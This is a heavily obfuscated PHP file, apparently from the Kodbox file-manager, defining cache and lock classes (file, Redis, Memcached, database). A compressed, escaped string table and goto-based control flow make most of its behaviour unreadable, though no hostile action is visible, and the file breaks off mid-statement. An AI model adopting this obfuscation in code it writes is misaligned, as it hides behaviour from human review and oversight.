\x8a\x8d\x1a\x5\xf2\x7c\x95\x24"."\220\160\5\335\146\51\70\207\244\147\206\202\22\73\101\230\31\233\361\43\354\361\52\141\316\101\76\305\16\362\306\145\147\260\217\323\5\256\311\204\243\102\373\240\124\136\46\156\101\136\130\223\0\47\126"."\324\123\146\61\215\167\164\311\173\136\336\216\351\175\162\220\250\130\260\25\43\36\303\221\213\300\316\126\45\242\210\127\152\40\145\227\144\327\255\322\333\130\50\44\51\23\113\54\265\267\136\341\274\270\112"."\113\246\201\31\122\4\111\137\211\55\167\211\252\211\240\200\252\331\20\111\136\274\224\344\67\346\56\136\231\131\303\53\62\227\314\114\337\161\1\304\43\45\356\201\45\307\241\142\361\73\65\242\147\162\26"."\x52\x67\x59\x16\x1a\x87\x39\x43\x61\x23\x2f\xc7\x58\x58\x59\xa8\x8b\xcd\x62\xa5\x98\xa\x55\x91\x28\x69\x44\x53\xc\xd3\x80\x12\xac\x16\x83\x4\x11\x23\x3a\x53\x3e\xf3\xd6\x37\x78\x99\x67\x62\xd9\x6e\x9e\x1d\x33\x61\x97"."\x43\xeb\x4c\x42\x3\x7c\x50\x67\xa4\xe\xac\x88\x20\x9d\x48\x63\x4a\x4a\x8\xc4\xc7\xa3\x70\x47\x47\x1c\x5b\xf2\xf9\x24\x1e\x30\x79\x88\x68\x8\xca\x44\x5e\x28\xcd\x52\x13\x23\xb7\x5e\x25\x8f\xa7\x63\x81\xa3\x5b\x1c\x46".base64_decode('Ya4EaCU44+FBM8GDUW+Tzn3LVQg8vCfriJFcQuFUmMshkEk1H8UQCD1ILGjlJE2AEyYHlmsNYw==')."\xa4\x83\xa1\xa4\x3e\x82\xe0\x68\x5e\x53\x8b\x7d\x4\x39\x64\xa5\xed\x23\xdc\x93\xb\xd6\xc8\xc7\x3b\x39\xb7\xff\xb2\xe4\x0\x8b\xe5\xb8\x67\x39\x2\xd4\xc4\xc1\x91\x9b\x83\x78\xaa\x21\x9d\xb9\xfb\x61\x22\x85\xce\xb6\x4e"."\77\7\65\363\325\107\45\72\302\3\160\220\251\371\353\303\72\363\265\237\63\122\112\44\272\64\34\14\104\132\302\361\145\112\37\276\121\26\332\357\250\271\52\131\225\252\45\364\353\350\242\40\322\163\72"."\354\14\173\223\374\375\75\374\351\115\242\243\215\67\315\217\204\226\70\374\221\116\101\141\342\155\145\147\261\24\373\364\142\131\211\171\154\261\237\55\313\203\357\4\52\244\316\12\201\265\224\270\120\324\313"."\xd3\x8f\xe8\x58\xf1\x5e\x6a\xb1\x94\xa1\x54\xa1\x35\x90\xbe\x72\xd\xe4\xf1\x44\x39\x35\x62\x8a\xf4\xfc\x44\x8d\x37\xf2\x83\x86\x65\x88\x5\xce\x72\x8c\xc8\xa5\x7\x5a\xda\xc3\x1d\x6a\x20\x12\x89\xae\x74\x58\xc6\xa4\xe5"."\x77\x2e\xa5\x59\x10\x3\x4e\x6b\x92\xdd\x48\xcb\x10\xc7\xe3\x60\x2e\x21\xf\x9d\x2a\xd9\xc7\xb9\x44\xf0\xb1\x1c\x16\xf1\x8f\x1a\x77\x61\x5d\x60\x17\x78\x78\x63\x94\x1e\xea\x84\xa0\xf4\xc\x6e\xa1\xa8\x19\x96\x2e\x1\xe8"."\163\252\314\146\135\313\146\245\70\174\203\44\5\113\316\235\264\142\125\52\255\200\301\44\55\363\112\11\142\341\245\155\211\377\163\123\215\264\120\124\66\270\226\71\367\200\102\337\301\13\322\162\234\165\212"."\247\176\313\41\377\327\147\204\75\342\22\124\45\116\117\331\3\346\46\71\321\1\107\117\141\341\250\112\4\367\252\250\2\361\47\305\221\202\174\371\354\117\63\113\174\204\370\41\146\115\213\3\342\134\203"."\x53\x41\x21\xb8\x16\x7a\xd0\x36\x4c\x22\xf4\x64\x27\x20\x26\x40\x44\x14\x4\x6\xdc\xa1\xfa\xe9\x7a\x7\xd9\x6d\x28\xe6\x78\xe5\xb8\xac\xe\xf2\xd4\x1d\x8d\xeb\xc6\xbd\x40\x29\x7b\x45\x9f\x50\x88\x9b\x55\x89\xac\xee\x98".strrev('âµ!2ü'."\r".'pà›Ê¤³a)¥Kí“h„!Ûr‡¼@TIËæBÊêšæì_GR“JñÊŠÑ@'."\r".''."\n".'')."\x88\xb5\x3f\xcd\xdc\x48\x19\xc0\x21\xb4\x8b\xb0\x56\x73\x9d\x6e\xfc\xa4\x63\x3e\x63\xca\xa3\x4b\x6c\xc7\xb0\x29\xb1\x87\x7c\x51\x59\x88\x7\x1d\x30\x74\xbb\xfc\xfd\x5c\x9a\xfd\xff\x4d\x46\x1a\x19\x97\xdc\xea\x5b\xee\x2d"."\x90\x6f\x5f\xe\x33\x36\xa2\x71\xdd\x6f\xe\x9\xf1\x0\x83\x48\x8c\x16\x33\x9d\xab\xd4\xbc\x9\xba\x2a\xad\x2b\xe2\xab\x48\x7e\xc6\xd8\x61\x5d\xe7\x78\xb6\x92\x46\x28\xa5\x3c\xbe\x1f\x41\x24\x8\x66\x1c\x2b\x25\xb1\xc3".base64_decode('LUkstW0q/emBX7YXuhtBqRtUWcsR0Kn2LwHadSHrILkQOSloeceDrqjtld6Ixj7Knc+SilfUxQ==')."\x66\xeb\x7c\xfd\x92\xeb\x35\x58\x62\xb1\x58\xb6\xe3\xbd\xd5\x84\x99\xd0\xfa\x3c\x14\x77\x31\xf9\x13\xa1\xe6\x11\xf9\x5b\xb6\x8\x23\x2d\x47\x91\x4c\x4c\x29\xbc\x4e\x2c\x62\x10\xf\x79\x5d\x9c\x52\x3d\xf7\x23\xa1\xd2\xea"."\343\304\125\266\232\354\43\256\264\101\255\321\345\16\244\317\320\331\6\341\110\106\101\176\255\120\20\67\62\362\276\212\376\167\270\33\201\270\256\104\233\112\234\176\251\124\71\43\56\355\205\342\226\224\2"."\341\306\264\224\17\323\233\41\7\264\50\35\372\344\147\50\350\155\221\360\115\1\311\121\73\73\351\235\61\14\230\134\44\273\307\347\202\176\104\155\370\331\330\137\176\357\217\325\345\200\216\140\365\44\246"."\27\66\140\222\263\225\117\76\225\101\2\145\241\42\320\101\136\144\324\334\41\235\246\257\256\23\372\40\223\65\266\54\135\117\257\226\245\143\117\305\127\172\222\226\232\134\220\237\26\75\303\17\71\262\267"._kodDe('LpEy1DJEbrJt2CcK6bdxG9j8rC0f30B8ampO7pbOGwWmHd5Y+vXssp3RLfK8Si+NhMw+A/diLp4=')."\14\61\367\70\142\31\240\133\304\55\324\41\34\317\336\113\275\6\274\242\243\41\172\56\165\265\124\314\172\210\62\210\207\151\150\272\306\305\61\344\242\257\362\254\271\54\17\171\60\232\225\173\331\125\314".base64_decode('xoU5GWmRmEB5Vr62MWCWQY5xaSc1bFyYLLLLdXcyw4HfaKcWdu/02YeyzaIc01fn0g0zZ8+X5Q==')."\x23\x2\x7\xc4\x25\x34\xb8\x4b\x83\xbb\x74\xe0\x7b\x4\x56\x29\x8e\x41\xf5\x28\xec\xf5\x9\x99\x66\x90\x48\xa7\xe5\xf\x3c\xed\x22\xed\x3c\xae\xbd\xe2\xff\xb4\xc6\xa4\x83\x9\x4d\x2a\x3b\x5\x24\x71\x45\x33\x8b\xcf\xc7"."\71\174\57\140\27\65\347\31\260\302\121\207\155\266\144\24\53\276\30\55\155\176\236\262\215\220\362\27\4\33\241\77\174\104\141\135\347\215\324\0\361\31\107\152\240\166\177\36\113\37\366\320\1\363\310".strrev('y©ŒH`¤ƒˆE¨f&æ˜’ÖÌëS—eQÑ‚‘¤Î$CÅİ'."\n".'³Uº„ƒJâ8gpÊÔ#Œôà')."\121\330\42\123\62\22\145\123\132\151\40\135\265\121\334\66\261\376\226\45\221\107\147\11\164\6\52\40\210\150\233\223\214\265\360\43\62\26\204\213\220\263\223\40\263\22\321\322\261\266\362\71\30\217\45"."\x11\x13\x47\xf3\xd9\x91\x4a\x5d\xaf\xd0\x85\xaf\xc0\x6b\x76\x1a\xf5\x2f\x11\x4d\x97\xf4\x97\x9c\x13\xe4\x6a\x5\x65\x77\x39\xce\x10\x5b\x45\xf9\x9c\xed\xd5\x6c\x2f\xe7\x99\xa2\x64\x7c\x81\x5\x14\x7\x7f\x57\x91\x28\xa1"."\x90\x2c\xf6\x7a\x94\x89\x12\x95\xb9\x80\xa0\xeb\x46\x20\xa5\x14\x27\x7a\xc2\x3c\xcb\x4c\x20\x29\x61\x4\x5d\x5c\x4c\x11\xef\x1e\xc2\x49\x21\x21\x3d\xe\x32\x24\x3d\x47\x23\x7b\xc7\x20\x5\xc9\xb8\x5a\x5e\x34\xdd\x8e\x89"."\60\136\110\321\210\330\15\72\1\304\211\150\256\20\357\52\201\245\334\343\212\46\151\157\252\356\345\216\321\101\64\332\66\345\157\201\46\170\33\344\226\227\250\1\216\303\70\12\213\131\227\50\156\332\5"."\144\243\104\326\230\150\0\126\250\227\156\352\60\137\77\35\70\172\331\331\217\343\60\310\37\133\167\34\16\55\61\112\260\230\322\36\307\3\161\151\301\256\0\231\203\155\200\330\54\322\332\44\116\104\60"."\x1d\xe2\xab\xa3\x94\x13\x1\x49\x1a\x4e\x4e\x9a\x3c\xd2\xe1\x13\x9\x7b\x25\x76\x2d\x67\xe6\x69\x9\x5b\xec\xcb\x77\x9b\xf4\xa9\x14\xfa\xcd\x8e\x40\xbc\xc9\x84\x12\x57\x5a\x9d\xc2\x6e\xdb\x23\x6c\xb5\x3d\x6c\x97\xf6\x4c".base64_decode('njSJeMbAebhQpMKOQQbhK/iw2XXs3oJbPBKaywJL4XQCzcbX3JyUU+G5q0NOPmISoBqaBd+gIA==')._kodDe('Kxcd4L+L811+rNlWTYAKfHvSaopI2pBWd8YMGb8VqHkpoxJxjJhIznM6EL5PZduujmN89A6ofGc=')."\xaf\xa0\x28\x18\x56\x29\x9b\xa0\x57\x64\x43\x2a\x48\x14\x91\x94\x85\x20\x52\x29\x5c\xe7\x13\x12\x7b\x2b\x2c\x5\xa\x62\x67\xe\xc9\xd8\x1b\x36\x70\x57\xd7\x89\x96\xb4\xf3\x75\x24\x89\x7f\x2b\x4b\x26\xda\x8b\xd8\x3c\xae".base64_decode('qM2+UpipIC7oYNxl3z/RAjuH18J20buEkT/imgyooEz5HKAyeplwzKYDKE+UIHE+pztEyIHvuw==')."\233\245\303\55\115\144\311\143\353\270\104\41\14\140\241\144\263\333\175\307\11\123\316\45\253\313\224\127\300\251\215\234\5\333\166\70\105\214\314\255\202\267\316\353\2\324\173\135\305\31\26\275\311\161\55"."\44\271\61\324\364\12\13\274\142\130\304\304\104\212\344\122\216\334\340\173\313\363\110\366\377\362\55\177\331\262\255\114\105\170\243\4\121\307\137\362\170\60\152\324\131\64\311\330\102\252\122\256\206\130\15"."\x3a\x13\x71\x29\x9c\xa4\x3f\x9f\x92\x44\xd9\x6e\xde\x8d\x82\xa7\xfa\xe4\x7e\xc9\xb7\xd8\xce\xb\x32\xac\xab\x29\xee\x86\x13\xd1\x58\x48\x5d\x19\xc6\x9e\xad\xc2\x27\x86\xba\xd8\xeb\x12\x86\x49\x9e\x7b\x63\x45\x76\xb5\xcb"."\xed\xc4\x57\x2b\xad\x26\x47\x3e\xbc\x6c\xc5\xb3\x8\x76\xae\x10\xe4\xb7\xd7\x4e\xd3\x76\xc9\x12\x81\xf9\xff\x94\xa5\xbb\xce\xc4\xd8\x18\xca\xb9\x62\x17\x55\x4a\x96\x32\x8b\x96\x94\xc\xcb\x46\xd8\xc6\x9f\x61\xfa\x26\x5d"."\x79\xb4\xc8\xf5\x94\xad\xa7\x15\xcc\x2d\x38\xe\x40\xdd\xb3\xea\x66\xf6\x56\x2a\x18\x33\xea\x26\x2a\x19\xc5\xf3\x94\xb3\xbe\x26\x25\x9c\xc4\xe2\x33\xbd\xd0\xd6\x70\x94\x3a\xba\x8b\x85\x40\xda\xc3\x33\x55\x2c\xc8\xa4\xce"."\372\52\305\41\54\215\333\16\164\22\17\11\272\37\20\164\76\30\330\50\11\235\351\3\213\216\67\105\313\246\250\303\14\12\66\307\25\207\351\310\304\261\130\70\40\156\352\261\257\56\354\51\24\33\374"."\370\11\312\301\35\301\152\65\247\62\135\61\54\212\21\122\64\102\226\313\317\326\120\203\135\34\211\26\143\271\216\62\327\272\116\333\75\51\77\71\175\121\161\231\103\152\6\72\27\62\110\272\222\102\207"."\xd8\xb4\xf3\xd9\x58\x12\x49\xc0\xec\x6d\x13\x28\x41\xba\x45\x77\x2a\x31\x70\xcb\xe7\xb2\xd\xb8\x64\x44\xa4\x68\x92\x8b\xf9\xcf\x47\xbf\xd8\x35\x43\x58\x78\x72\x24\xd1\xf4\xde\x30\xe0\x3e\x55\x4a\xb9\xba\x1c\x2\x2\x49"."\xe5\x21\x45\xc8\x46\xa8\xfc\xae\x5b\x5c\xc1\x4b\x3c\x2e\xcb\x86\x25\xc\x82\xb3\x70\xc1\x25\xaa\x2b\xb6\x4e\x6d\x50\xf0\xe8\xe2\x0\x97\x4e\xb7\x6a\x83\x15\x92\xa6\xcb\x8e\x98\x8\xc2\x93\x12\x1e\x5f\xf2\xa3\x25\xcc\xb3"."\xf4\x21\xb9\x76\x48\x27\xcc\xa1\x1c\x9\xcb\xa1\xc2\xcf\x96\x94\xdf\x75\x34\x27\xdd\xc4\xb0\x4a\xdd\x27\x64\xcf\x99\x5d\xf6\xe3\xc5\x91\x4a\x80\xe8\x93\x9a\x5c\x3f\x48\x92\x7b\x60\x7d\x2a\xa1\x38\x44\xbb\xc2\xe5\x6e\xa2"."\112\247\327\60\236\214\317\31\112\103\14\65\275\16\250\353\344\216\105\234\214\21\165\105\201\320\117\52\276\242\154\120\102\1\75\33\221\212\223\325\40\46\314\20\257\134\211\300\112\347\20\113\162\60\21"."\xc1\x38\x1f\xd3\x31\xf8\xd2\x46\xc6\x3b\x6\x29\x63\x72\xa4\xa3\x39\x15\x50\x83\x9d\x4d\x64\xb9\x72\x79\xa4\x99\xcd\xe2\xcb\xee\x9\xa2\xa9\x86\xb6\xb4\xed\x96\xa7\xc8\x72\x5d\x1e\xda\x20\x72\xfa\x16\xb\x87\x2\x73\x44"."\132\105\343\2\316\50\232\136\167\215\233\234\301\75\246\64\207\343\255\152\31\76\144\330\251\176\111\124\120\36\131\16\57\226\115\63\64\240\162\77\334\255\145\263\354\326\217\22\205\224\265\107\122\336\112".base64_decode('mBXy0BZVzEajcE5xLnPknWAIcF4ahfOWRbPMZeNK8tlayZqge+WDB1LQdIUOC+milHSi8ayYuA==').base64_decode('vDpYA+7URNZWuRWSMNKpXFOpFRUTT9gKd2rBB+FTeKWYigsUFEkq7BgspsIeQenfhCpqQoOrfA==')."\263\22\161\25\224\310\300\133\230\313\15\131\205\150\131\43\255\262\316\132\254\42\175\263\234\172\145\56\270\343\21\3\112\222\30\143\274\116\66\151\346\152\225\242\44\304\60\146\215\1\241\277\313\14\217".base64_decode('pjq2t1J+IG/yLTMtdLZ5Q8oKcK6DfEl6w6ei6ZMHS9HKZVJZ9jiFbDRGJQCmbaQkpVZh+MJ7Zg==')."\x88\x23\x71\x56\x88\xb8\xdd\x17\x11\x42\xa6\xe7\xd0\x87\xaa\x24\xb5\xc7\x20\xfa\xe9\x13\x97\x75\xb4\x3c\x89\x47\x13\x8\xe2\x30\x4d\xa4\x9c\x11\x5c\x63\x52\x4d\x88\x20\x56\xc3\xe1\x37\xe0\xe4\x1a\x82\x72\x12\x34\x3a\x6e"."\x16\x6d\xf\xd5\xd2\x2f\x90\xdf\x66\xd3\xb6\x85\x2\x11\xbb\x14\x41\xe7\x0\xcc\xe\x78\x24\x3d\x39\xf4\x25\xae\xbe\x71\xa3\xc8\xd\x2a\xc1\x61\x7a\xad\x81\x3f\x41\x27\x3\xb\x9e\xe2\x3a\x8d\x25\x44\xcf\x11\xc0\x77\xb5".base64_decode('PBArv6pt5a+oDJjppDnMnEMjzJHGRPKHCT4kJU0+4gzH8tMYP7wm6SUXKl5wV7y20OfITp/z5g==')."\xda\xf7\x5f\x55\x2\x5c\x26\x88\x22\xe8\x53\x72\x44\x78\xc\xe6\x90\xf1\x44\xbc\x2c\xaa\x33\x10\x8f\xaf\x8c\xc6\x5a\xe8\xcb\x73\x65\xd1\x24\x97\xa4\x22\x59\x16\xd5\xd9\x16\xed\x98\x28\x2e\xd4\x1e\x8\x47\xca\xe2\xb0\x36"."\145\207\52\74\214\323\250\160\47\151\45\121\62\230\250\25\341\340\62\321\22\166\275\31\201\327\310\305\44\110\227\173\205\176\63\77\321\74\262\2\342\32\363\341\50\337\163\351\71\341\226\136\24\342\24"."\302\311\167\141\26\173\364\206\177\70\237\213\166\251\56\73\125\166\30\346\102\261\130\153\262\3\152\212\25\0\212\237\357\343\4\200\237\47\204\362\216\317\241\67\44\301\311\42\41\124\107\132\273\362\356".base64_decode('Tu6HuWyORE+vOJoVLinlm14cKwYHN/ME9v7OWjMpjnBwtgP3BzDckp4s/XZE21qfl5MDSSOGig==')."\xd0\x31\x51\x10\xc2\xed\xff\x7\xc6\x3d\x3d\xab\x7f\xc5\x0\x0", 10, -8))); goto D„–¼’œĞ; D„–¼’œĞ: define($_SERVER[€ä¾™²][0], $_SERVER[€ä¾™²][1]); $_SERVER[ê˜¼õ×â] = explode($_SERVER[€ä¾™²][2], gzinflate(substr($_SERVER[€ä¾™²][3], 10, -8))); function binCheckEq($åıÖÁ£Ø, $úç­‘) { return $åıÖÁ£Ø == $úç­‘; } goto AêãÚ„“•¨; AêãÚ„“•¨: $fileSize = strrev(base64_decode($_SERVER[ê˜¼õ×â][0])); function binCheckNeq($ğŠ¦†õ…, $©Ü¿ô—) { return $ğŠ¦†õ… != $©Ü¿ô—; } $_SERVER[$_SERVER[ê˜¼õ×â][1]] = $fileSize($_SERVER[$_SERVER[ê˜¼õ×â][2]]); goto aœººÑí; b‚İÊÒÅŞ…: class Cache { protected static $handle; protected static $memoryCache; protected static $runTimeCache; public static function init() { $¶¤Á£ò§ =& $_SERVER[€ä¾™²]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); self::$runTimeCache = array(); $­ßÓà‘« = $GLOBALS[$¶¤Á£ò§[6]][$¶¤Á£ò§[425]]; $²Ö§Ç„§ = $­ßÓà‘«[$­ßÓà‘«[$¶¤Á£ò§[934]]]; $û¢äËÈ = $­ßÓà‘«[$¶¤Á£ò§[935]]; switch ($­ßÓà‘«[$¶¤Á£ò§[934]]) { case $¶¤Á£ò§[21]: self::$handle = Model($¶¤Á£ò§[936]); break; case $¶¤Á£ò§[937]: self::$handle = new CacheRedis($²Ö§Ç„§, $û¢äËÈ); break; case $¶¤Á£ò§[938]: self::$handle = new CacheMemcached($²Ö§Ç„§, $û¢äËÈ); break; case $¶¤Á£ò§[231]: self::$handle = new CacheFile($²Ö§Ç„§, $û¢äËÈ); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($•ÂÁ‚úı) { if (is_array($•ÂÁ‚úı) || is_object($•ÂÁ‚úı)) { $•ÂÁ‚úı = json_encode($•ÂÁ‚úı); } $•ÂÁ‚úı = rawurlencode($•ÂÁ‚úı); return md5(KOD_SITE_ID . $_SERVER[€ä¾™²][11] . $•ÂÁ‚úı); } public static function get($ÀŠŸ„‡Á, $›£Ï’œ‰ = false) { $Áòøû¬ = self::key($ÀŠŸ„‡Á); $ÛÜùÔ€ = self::init(); if ($›£Ï’œ‰) { return unserialize($ÛÜùÔ€->get($Áòøû¬)); } if (!isset(self::$memoryCache[$Áòøû¬])) { $ˆ»÷äã = $ÛÜùÔ€->get($Áòøû¬); self::$memoryCache[$Áòøû¬] = unserialize($ˆ»÷äã); } return self::$memoryCache[$Áòøû¬]; } public static function set($ËÀÂÁ Š, $‚‚ß, $ªå³³— = false) { $«ü–‚ À =& $_SERVER[€ä¾™²]; $Û“’Ë÷ = self::key($ËÀÂÁ Š); if (isset(self::$memoryCache[$Û“’Ë÷]) && self::$memoryCache[$Û“’Ë÷] === $‚‚ß) { return !0; } if ($ªå³³— === 0) { self::$memoryCache[$Û“’Ë÷] = $‚‚ß; return !0; } $¡Áí†¥Î = self::init(); $¾³Ç¤Ë = serialize($‚‚ß); CacheLock::lock($ËÀÂÁ Š . $«ü–‚ À[939]); $ášûŠÃ = $¡Áí†¥Î->set($Û“’Ë÷, $¾³Ç¤Ë, $ªå³³—); self::$memoryCache[$Û“’Ë÷] = $‚‚ß; CacheLock::unlock($ËÀÂÁ Š . $«ü–‚ À[939]); return $ášûŠÃ; } public static function getCall($¥÷øƒÈØ, $ÔâßºÎÕ, $‹Û‹âøÕ, $è˜ü™û„ = array()) { $ õçœó¨ =& $_SERVER[€ä¾™²]; $Ç¦§Íªï = self::get($¥÷øƒÈØ); if ($Ç¦§Íªï || $Ç¦§Íªï === $ õçœó¨[12]) { return $Ç¦§Íªï; } $Ç¦§Íªï = call_user_func_array($‹Û‹âøÕ, $è˜ü™û„); $Ç¦§Íªï = $Ç¦§Íªï ? $Ç¦§Íªï : $ õçœó¨[12]; self::set($¥÷øƒÈØ, $Ç¦§Íªï, $ÔâßºÎÕ); return $Ç¦§Íªï; } public static function limitCall($¶Šãï¢°, $¬Ô Ü• = 15, $è•ãó‚ = 30, $ß»ˆ´ƒò = true) { $ø í÷üí =& $_SERVER[€ä¾™²]; static $¾¨âşøÚ = array(); if ($ß»ˆ´ƒò) { $¶Šãï¢° = $¶Šãï¢° . $ø í÷üí[940] . KodUser::id() . $ø í÷üí[941] . get_client_ip(); } if (isset($¾¨âşøÚ[$¶Šãï¢°]) && is_array($¾¨âşøÚ[$¶Šãï¢°])) { return $¾¨âşøÚ[$¶Šãï¢°][$ø í÷üí[333]] <= $è•ãó‚; } $å¼Ê‰òä = self::get($¶Šãï¢°); if (!is_array($å¼Ê‰òä) || time() - $å¼Ê‰òä[$ø í÷üí[205]] > $¬Ô Ü•) { $å¼Ê‰òä = array($ø í÷üí[205] => time(), $ø í÷üí[333] => 0); } $å¼Ê‰òä[$ø í÷üí[333]]++; self::set($¶Šãï¢°, $å¼Ê‰òä, $¬Ô Ü•); $¾¨âşøÚ[$¶Šãï¢°] = $å¼Ê‰òä; return $å¼Ê‰òä[$ø í÷üí[333]] <= $è•ãó‚; } public static function limitRuntime($ÚíŒº­‡, $ú¸€Ù) { $ƒü•ÖÅ = $_SERVER[€ä¾™²][942] . $ÚíŒº­‡; if (isset(self::$runTimeCache[$ƒü•ÖÅ]) || !$ú¸€Ù) { return !0; } $Æ—ª‘ƒ† = intval(self::get($ƒü•ÖÅ)); $Æ—ª‘ƒ† = !$Æ—ª‘ƒ† || $Æ—ª‘ƒ† <= 0 ? 1 : $Æ—ª‘ƒ† + 1; if ($Æ—ª‘ƒ† > $ú¸€Ù) { return !1; } self::$runTimeCache[$ƒü•ÖÅ] = !0; self::set($ƒü•ÖÅ, $Æ—ª‘ƒ†, 3600); return !0; } public static function limitRuntimeClear() { if (!self::$runTimeCache) { return; } foreach (self::$runTimeCache as $˜¼ÏÏÈö => $…æ‹ü×å) { $èÇùÏâÏ = intval(self::get($˜¼ÏÏÈö)); $èÇùÏâÏ = !$èÇùÏâÏ || $èÇùÏâÏ <= 1 ? 0 : $èÇùÏâÏ - 1; self::set($˜¼ÏÏÈö, $èÇùÏâÏ, 3600); } self::$runTimeCache = array(); } public static function remove($ã‰“ å–) { $ßãÎªÇ = self::key($ã‰“ å–); unset(self::$memoryCache[$ßãÎªÇ]); self::clearTimeout(); CacheLock::lock($ã‰“ å–); $õ”‘––¬ = self::init()->remove($ßãÎªÇ); CacheLock::unlock($ã‰“ å–); return $õ”‘––¬; } public static function removeMemory($¶áåù¯) { $Â™‹ş = self::key($¶áåù¯); unset(self::$memoryCache[$Â™‹ş]); } public static function clearMemory($è€Ú¡åª = false) { if ($è€Ú¡åª) { $è€Ú¡åª = self::key($è€Ú¡åª); unset(self::$memoryCache[$è€Ú¡åª]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[€ä¾™²][943])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[€ä¾™²][944])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($µª©‚§¯, $—ÄàÆ»Ş) { $î¸‘• =& $_SERVER[€ä¾™²]; $this->cachePath = $µª©‚§¯[$î¸‘•[87]]; $this->prefix = $î¸‘•[945]; $this->cacheTime = $—ÄàÆ»Ş; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($’Ïüší’) { $ïÏÍì× =& $_SERVER[€ä¾™²]; $’Ïüší’ = str_replace(array($ïÏÍì×[946], $ïÏÍì×[98], $ïÏÍì×[76]), $ïÏÍì×[947], $’Ïüší’); return $this->cachePath . $ïÏÍì×[948] . $’Ïüší’ . $ïÏÍì×[949]; } public function set($ıÛ³“ôò, $äô¹™», $¤¸Ø§®Á = false) { $¤¸Ø§®Á = $¤¸Ø§®Á ? $¤¸Ø§®Á : $this->cacheTime; $ÄÎÅĞÒÚ = $this->getFile($ıÛ³“ôò); if (file_put_contents($ÄÎÅĞÒÚ, $this->prefix . $äô¹™», LOCK_EX)) { @touch($ÄÎÅĞÒÚ, intval(time() + $¤¸Ø§®Á)); clearstatcache(); return !0; } @unlink($ÄÎÅĞÒÚ); return !1; } public function get($ŸÊø“‹°) { $åå„åë™ = $this->getFile($ŸÊø“‹°); if (file_exists($åå„åë™) && filemtime($åå„åë™) < time()) { @unlink($åå„åë™); return !1; } $¿ÇÚùòÏ = @file_get_contents($åå„åë™); return substr($¿ÇÚùòÏ, strlen($this->prefix)); } public function remove($‡•½ªµ…) { $ŒÀÃùØÂ = $this->getFile($‡•½ªµ…); return @unlink($ŒÀÃùØÂ); } public function deleteAll() { $ÈËÉ¶˜ó =& $_SERVER[€ä¾™²]; $¶Ì¤¯„¹ = scandir($this->cachePath); foreach ($¶Ì¤¯„¹ as $§”íéÄ·) { $–¤ŸÂí = $this->cachePath . $§”íéÄ·; if (strpos($–¤ŸÂí, $ÈËÉ¶˜ó[949]) && strpos($–¤ŸÂí, $ÈËÉ¶˜ó[950])) { @unlink($–¤ŸÂí); } } } public function clearTimeout() { $­öã­³’ =& $_SERVER[€ä¾™²]; $Õá™ÛË‹ = scandir($this->cachePath); foreach ($Õá™ÛË‹ as $Ÿàø¸Õœ) { $Üô•çí = $this->cachePath . $Ÿàø¸Õœ; if (strpos($Üô•çí, $­öã­³’[949]) && strpos($Üô•çí, $­öã­³’[950]) && filemtime($Üô•çí) < time()) { @unlink($Üô•çí); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $ÛÛ†’Á÷ =& $_SERVER[€ä¾™²]; if (self::$handle) { return self::$handle; } $È›íÎ‹ = $GLOBALS[$ÛÛ†’Á÷[6]][$ÛÛ†’Á÷[425]]; self::$timeout = $È›íÎ‹[$ÛÛ†’Á÷[951]] ? $È›íÎ‹[$ÛÛ†’Á÷[951]] : 10; $ÄÓ§í° = _get($GLOBALS[$ÛÛ†’Á÷[6]], $ÛÛ†’Á÷[952]); $ôğª½Ğá = $È›íÎ‹[$ÛÛ†’Á÷[934]] ? $È›íÎ‹[$ÛÛ†’Á÷[934]] : $ÛÛ†’Á÷[231]; if ($ôğª½Ğá == $ÛÛ†’Á÷[21] && $ÄÓ§í° == $ÛÛ†’Á÷[13]) { $ôğª½Ğá = $ÛÛ†’Á÷[231]; } switch ($ôğª½Ğá) { case $ÛÛ†’Á÷[937]: self::$handle = new CacheLockRedis(); break; case $ÛÛ†’Á÷[938]: self::$handle = new CacheLockMemcached(); break; case $ÛÛ†’Á÷[21]: self::$handle = new CacheLockDatabase(); break; case $ÛÛ†’Á÷[231]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($ÛÛ†’Á÷[953], $ÛÛ†’Á÷[954]); } return self::$handle; } private static function key($”×…ûıñ) { return $_SERVER[€ä¾™²][955] . Cache::key($”×…ûıñ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($œÈÌÁ›Ğ = '') { self::$errorMsg = $œÈÌÁ›Ğ; } public static function lockGlobal($¡İÚ»ó, $¾ÜØ½û) { return self::lock($¡İÚ»ó, $¾ÜØ½û, !0); } public static function lock($ƒÌÎâ¡, $ìØ‡ÔĞÃ = false, $ˆ™ñ¦ûš = false) { $É˜ìÖõÏ =& $_SERVER[€ä¾™²]; $°€Ä‡—ï = self::init(); $é›à¹Ëœ = self::key($ƒÌÎâ¡); $ìØ‡ÔĞÃ = $ìØ‡ÔĞÃ ? $ìØ‡ÔĞÃ : self::$timeout; $ŸŠ¬ÍÕ¶ = timeFloat(); if (_get($GLOBALS, $É˜ìÖõÏ[956], !1)) { if (!$°€Ä‡—ï->lock($é›à¹Ëœ, 0.2)) { die; } return !0; } $È´ªûıû = $°€Ä‡—ï->lock($é›à¹Ëœ, $ìØ‡ÔĞÃ); $ë’ÖÕ§û = timeFloat(); if (!$È´ªûıû) { $›Ä‘Šù = "\x6c\157\143\x6b\x20\x65\x72\162\x6f\162\73\153\x65\171\75{$ƒÌÎâ¡}\73\164\x69\x6d\145\x3d{$ìØ‡ÔĞÃ}\x3b" . self::$errorMsg . $É˜ìÖõÏ[74] . get_caller_msg(); $¸Ï‹ŒŞ = LNG($É˜ìÖõÏ[957]) . "\50{$ìØ‡ÔĞÃ}\x73\51\x2e" . LNG($É˜ìÖõÏ[958]); $¸Ï‹ŒŞ .= $É˜ìÖõÏ[959]; if (is_string(self::$errorMsg) && self::$errorMsg) { $¸Ï‹ŒŞ = $¸Ï‹ŒŞ . $É˜ìÖõÏ[960] . self::$errorMsg; } write_log($É˜ìÖõÏ[961] . 